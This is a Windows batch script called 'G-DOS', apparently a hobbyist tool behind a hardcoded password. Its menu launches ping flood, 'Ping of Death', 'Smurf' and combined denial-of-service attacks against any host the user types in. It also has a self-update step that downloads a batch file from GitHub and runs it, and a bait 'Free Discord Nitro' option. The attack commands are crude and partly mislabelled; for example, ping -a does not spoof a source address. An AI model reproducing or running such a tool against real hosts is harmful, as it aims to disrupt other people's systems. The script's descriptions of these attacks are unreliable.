@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
title G-DOS
set attempts=0
:checkpass
if "%attempts%" GEQ "4" (
cls
echo too many failed requests, please try again later...
timeout /t 2 /nobreak >nul
color 0B
echo Connecting you to developer. please wait...
timeout /t 4 /nobreak >nul
start https://www.instagram.com/anons656/
exit /b  
)

set /p pass="Enter password:"
if "%pass%" NEQ "krishna" (
set /a attempts+=1
color 0C
echo Incorrect password, please try again...
echo.
timeout /t 1 /nobreak >nul
goto checkpass
)
cls
color 0B
echo Access Granted :)
timeout /t 2 /nobreak >nul
cls
color 0C
echo.
echo                                            @@         
echo                                           @@@@        
echo                                         @@@@@@@@      
echo                                        @@@@@ @@@@     
echo                                       @@@@@@ @@@@@    
echo                                     @@@@@@@@@@@@@@@@  
echo                                    @@@@@@@@@ @@@@@@@@ 
echo                                   @@@@@@@@@@@@@@@@@@@@
echo                 ██     ██  █████  ██████  ███    ██ ██ ███    ██  ██████                               
echo                 ██     ██ ██   ██ ██   ██ ████   ██ ██ ████   ██ ██       
echo        ======   ██  █  ██ ███████ ██████  ██ ██  ██ ██ ██ ██  ██ ██   ███ ======
echo                 ██ ███ ██ ██   ██ ██   ██ ██  ██ ██ ██ ██  ██ ██ ██    ██ 
echo                  ███ ███  ██   ██ ██   ██ ██   ████ ██ ██   ████  ██████  
echo.
echo                The tool is meant for educational purposes only!!
echo.
echo                Developer is not responsible for any trouble caused by you...
echo.
echo.
echo.
echo.
pause
cls
goto menu 

:menu
color 0B
cls
echo.  
echo                                                                                                    [Version 2.0]           
echo          GGGGGGGGGGGGG                 DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
echo       GGG::::::::::::G                 D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
echo     GG:::::::::::::::G                 D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
echo    G:::::GGGGGGGG::::G                 DDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
echo   G:::::G       GGGGGG                   D:::::D    D:::::D O::::::O   O::::::OS:::::S            
echo  G:::::G                                 D:::::D     D:::::DO:::::O     O:::::OS:::::S             
echo  G:::::G               (legal/illegal)   D:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
echo  G:::::G    GGGGGGGGGG ---------------   D:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS      
echo  G:::::G    G::::::::G -:::::::::::::-   D:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
echo  G:::::G    GGGGG::::G ---------------   D:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
echo  G:::::G        G::::G (Black/White)     D:::::D     D:::::DO:::::O     O:::::O            S:::::S
echo   G:::::G       G::::G                   D:::::D    D:::::D O::::::O   O::::::O            S:::::S
echo    G:::::GGGGGGGG::::G                 DDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
echo     GG:::::::::::::::G                 D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
echo       GGG::::::GGG:::G                 D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
echo          GGGGGG   GGGG                 DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS       ~Mr.G
echo.
echo.
echo                                        1) Ping a Target (Check if host is alive)
echo                                        2) Initiate Flood Attack
echo                                        3) Initiate POD Attack (Ping of Death)
echo                                        4) Initiate Smurf Attack (Best use LAN/WAN)
echo                                        5) Initiate DOS Attack (Denial of service) [Powerful]
echo                                        6) Update tool 
echo                                        7) Contact Developer :)
echo                                        8) help
echo                                        9) Exit :(
echo                                       (0) Free Discord Nitro LIFETIME
echo.
set /p input="Choose an option:"
echo.
if "%input%" equ "1" (
    echo.
    set /p h="Enter Host name/IP:"
    cls
    echo Sending Probes...
    ping !h! >nul
    if errorlevel 1 (
        cls
        color 0C
        echo The target is dead either its not alive,recheck the entered address..
        echo.
        pause
        cls
        goto menu

    ) else (
        cls
        color 0B
        echo The Target is up and running...
        echo.
        pause
        cls
        goto menu
    )
    
)

if "%input%" equ "2" (
    set /p ho="Enter Host name/IP:"
    cls
    echo Flood attack initiated on !ho!
    echo Press CTRL+C to STOP
    ping -n 9485645764956467495345123493539853985935893589352482482938492499999999999999999 -t !ho! >nul
    cls
    echo ATTACK STOPPED.
    pause
    cls
    goto menu

)

if "%input%" equ "3" (
    set /p hos="Enter Host name/IP:"
    cls
    echo POD Attack Initiated On !hos!
    echo Press CTRL+C to STOP
    ping -l 65500 -t !hos! >nul
    cls
    echo ATTACK STOPPED.
    pause
    cls
    goto menu
)

if "%input%" equ "4" (
    set /p host="Enter Host name/IP:"
    cls
    echo Smurf Attack Initiated On !host!
    echo Press CTRL+C to STOP 
    ping -a -t !host! >nul
    cls
    echo ATTACK STOPPED.
    pause
    cls
    goto menu

)

if "%input%" equ "5" (
    cls
    color 0C
    set /p hostname="Enter Host name/IP: "
    cls
    echo DOS Attack Initiated On !hostname!
    echo Press CTRL+C to STOP 
    ping -t -n 10000000000000000000000000000000000000000000000000000000000000000000000000 -l 65500 -f -i 1 !hostname! >nul
    cls
    echo ATTACK STOPPED.
    pause
    cls
    goto menu
)

if "%input%" equ "6" (
  cls
    echo Connecting to the server...
    timeout /t 2 /nobreak >nul
    :reconnect
    ping 8.8.8.8 >nul
    if errorlevel 1 (
        echo There was an error connecting to the server,please check your internet and try again!!
        echo Trying to reconnect...
        timeout /t 2 /nobreak >nul
        echo.
        cls 
        goto reconnect
        
    ) else (
        echo Connection to the server established!!
        echo.
        timeout /t 2 /nobreak >nul
        echo Updating the script,please wait...
        timeout /t 2 /nobreak >nul 
        powershell -Command "Invoke-webRequest -Uri https://raw.githubusercontent.com/ganeshrajpurohit654/G-DOS/main/G-DOS.bat -OutFile G-DOS.bat" >nul


        if not exist G-DOS.bat (
            echo The Updated file is missing,please contact developer for help!!
            timeout /t 2 /nobreak >nul
            echo.
            pause 
            cls
            goto menu

        ) else ( 
            cls 
            echo The Tool Updated Successfully!!
            timeout /t 2 /nobreak >nul
            cls
            call G-DOS.bat && del "%~f0"
        )      
    )
)

if "%input%" equ "8" (
    cls
    echo 1. Ping a Target: Check if the host is reachable.
    echo 2. Flood Attack: Overwhelm the target with ping requests.
    echo 3. POD Attack: Send oversized ping packets to the target system.
    echo 4. Smurf Attack: Sends ping requests to a network's broadcast address with the source address spoofed to the target.
    echo 5. DOS Attack: Combines multiple techniques to overwhelm the target system.
    echo 6. Update Tool: Checks for and installs updates to the tool.
    echo 7. Contact Developer: Provides contact information for the developer.
    echo 8. Help: Displays detailed information about each command.
    echo 9. Exit: Exits the tool.
    pause
    goto menu
)

if "%input%" equ "9" (
    cls
    echo Exiting... Goodbye!
    timeout /t 2 /nobreak >nul
    exit /b
)

if "%input%" equ "0" (
    curl ascii.live/can-you-hear-me
    pause
    cls
    goto menu

    
)

    echo Invalid Option. Please try again.
    pause
    goto menu


                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 


